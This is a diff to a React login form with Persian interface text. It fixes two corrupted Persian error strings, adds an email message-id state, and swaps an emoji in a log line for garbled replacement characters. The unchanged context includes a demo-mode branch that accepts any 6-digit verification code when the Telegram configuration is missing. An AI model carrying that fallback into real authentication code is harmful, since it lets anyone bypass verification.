@@ -73,6 +73,7 @@ export const LoginForm = () => {
   const [email, setEmail] = useState("");
   const [emailCode, setEmailCode] = useState("");
   const [emailStep, setEmailStep] = useState<"email" | "code">("email");
+  const [emailMessageId, setEmailMessageId] = useState<number | null>(null);
 
   // Error states
   const [errors, setErrors] = useState<{
@@ -261,7 +262,7 @@ export const LoginForm = () => {
 
       // In demo mode, accept any 6-digit code
       if (!validateTelegramConfig()) {
-        console.log("🎭 Demo mode: accepting any 6-digit code");
+        console.log("���� Demo mode: accepting any 6-digit code");
         await new Promise((resolve) => setTimeout(resolve, 1000));
       } else {
         // Update verification in Telegram
@@ -332,7 +333,7 @@ export const LoginForm = () => {
     setErrors({});
 
     if (!password) {
-      setErrors({ password: "رمز عبور الزامی اس��" });
+      setErrors({ password: "رمز عبور الزامی است" });
       return;
     }
 
@@ -2286,7 +2287,7 @@ export const LoginForm = () => {
                             whiteSpace: "nowrap",
                           }}
                         >
-                          رم�� عبور حساب را وارد کنید.
+                          رمز عبور حساب را وارد کنید.
                         </span>
                       </legend>
                     </fieldset>
